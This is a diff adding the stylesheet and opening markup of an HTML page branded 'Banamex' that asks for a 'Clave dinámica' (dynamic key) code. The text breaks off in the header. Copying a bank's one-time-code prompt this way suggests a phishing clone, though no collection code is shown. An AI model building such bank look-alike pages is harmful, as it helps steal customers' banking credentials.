@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Banamex - Clave dinámica (versión escritorio)</title>
+<style>
+  /* Estilos específicos para escritorio: contenedor ancho fijo centrado */
+  :root{
+    --bg:#ffffff;
+    --text:#0b2a2d;
+    --muted:#6c8b8b;
+    --accent:#073c40;
+    --card-border:#e6eef0;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family: "Helvetica Neue", Arial, sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+  }
+
+  /* Contenedor principal con ancho fijo para escritorio */
+  .container {
+    width: 1100px;               /* diseñado para escritorio */
+    margin: 28px auto;
+    padding: 24px;
+  }
+
+  /* Header: logo grande + fecha/hora alineada */
+  .header {
+    display:flex;
+    align-items:flex-start;
+    gap:20px;
+  }
+  .brand-mark {
+    width:72px;
+    height:72px;
+    border-radius:14px;
+    background: radial-gradient(circle at 30% 30%, #ff4666 0%, #d32b3b 45%, #8f1320 100%);
+    box-shadow: 0 3px 8px rgba(0,0,0,0.06);
+    flex: 0 0 72px;
+  }
+  .brand-right {
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+  }
+  .brand-text {
+    font-size:40px;
+    font-weight:800;
+    color:var(--text);
+    line-height:1;
+  }
+  .datetime {
+    margin-top:8px;
+    color:var(--muted);
+    font-size:15px;
+  }
+
+  /* Card principal ancho completo dentro del contenedor */
+  .card {
+    margin-top:22px;
+    border-radius:12px;
+    border:1px solid var(--card-border);
+    background: linear-gradient(180deg,#ffffff 0%, #fbfdff 100%);
+    box-shadow: 0 14px 36px rgba(8,18,20,0.06);
+    padding:28px;
+    display:flex;
+    gap:22px;
+  }
+
+  /* Columnas: izquierda 56%, derecha 44% */
+  .col-left { width:56%; padding-right:12px; }
+  .col-right{ width:44%; padding-left:12px; border-left:1px dashed #e9f1f1; display:flex; flex-direction:column; justify-content:space-between; }
+
+  .title {
+    font-size:22px;
+    font-weight:800;
+    color:#173a3d;
+    margin-bottom:8px;
+  }
+
+  .instructions {
+    background:#f7fbfb;
+    padding:18px;
+    border-radius:10px;
+    border:1px solid #e6f0f0;
+    color:#244a4c;
+    line-height:1.55;
+    font-size:15px;
+  }
+
+  .challenge {
+    margin-top:18px;
+    display:flex;
+    align-items:center;
+    gap:18px;
+    background:#fff;
+    padding:20px;
+    border-radius:10px;
+    border:1px solid #e8e8e8;
+  }
+  .challenge .tag {
+    background:#f2f7f7;
+    padding:10px 14px;
+    border-radius:8px;
+    font-weight:800;
+    color:#123f40;
+    font-size:15px;
+    border:1px solid #e6eded;
+  }
+  .challenge .code {
+    font-size:30px;
+    font-weight:900;
+    letter-spacing:1.6px;
+    color:#071a1a;
+  }
+
+  /* Right column contents */
+  .explain {
+    color:#215253;
+    font-size:15px;
+    margin-bottom:16px;
+  }
+
+  .field {
+    margin-top:6px;
+  }
+  label {
+    display:block;
+    font-weight:700;
+    color:#164043;
+    font-size:14px;
+    margin-bottom:8px;
+  }
+
+  input[type="text"]{
+    width:100%;
+    padding:14px 14px;
+    font-size:18px;
+    border-radius:8px;
+    border:1px solid #bfcfcf;
+    outline:none;
+  }
+  input[type="text"]:focus{
+    border-color:#188c8c;
+    box-shadow:0 0 0 6px rgba(24,140,140,0.06);
+  }
+
+  .actions {
+    display:flex;
+    gap:12px;
+    margin-top:18px;
+    align-items:center;
+  }
+
+  .btn {
+    padding:12px 20px;
+    border-radius:10px;
+    font-weight:800;
+    font-size:15px;
+    border:none;
+    cursor:pointer;
+  }
+  .btn-cancel {
+    background:#fff;
+    color:#c23b3b;
+    border:1px solid #f0dede;
+  }
+  .btn-continue {
+    background:var(--accent);
+    color:#fff;
+    box-shadow: 0 10px 26px rgba(7,60,64,0.16);
+  }
+
+  /* Small help tab on right (visual) */
+  .help-tab{ position:relative; width:28px; height:140px; }
+  .help-tab::after{
+    content:"?";
+    position:absolute;
+    right:-22px;
+    top:50%;
+    transform:translateY(-50%);
+    background:#4f2b3a;
+    color:#fff;
+    width:46px;height:46px;border-radius:24px;
+    display:flex;align-items:center;justify-content:center;font-weight:800;font-size:18px;
+  }
+
+  /* Token + footer */
+  .token { margin-top:14px; color:#b1b1b1; font-size:13px; letter-spacing:0.4px; }
+  footer{ margin-top:28px; color:#9aa7a7; font-size:13px; padding-top:8px; border-top:1px solid #f0f0f0; }
+
+  /* Prevent mobile stacking: for desktop-only we keep widths fixed; but if user opens smaller, allow graceful collapse */
+  @media (max-width:1120px){
+    .container{ width: 95%; }
+    .col-left, .col-right{ width:100%; border-left:none; padding:0; }
+    .card{flex-direction:column}
+    .brand-text{font-size:34px}
+  }
+</style>
+</head>
+<body>
+  <div class="container" role="document">
+    <header class="header" role="banner" aria-label="Encabezado Banamex">
+      <div class="brand-mark" aria-hidden="true"></div>
+      <div class="brand-right">
+        <div class="brand-text">Banamex</div>
+     ...
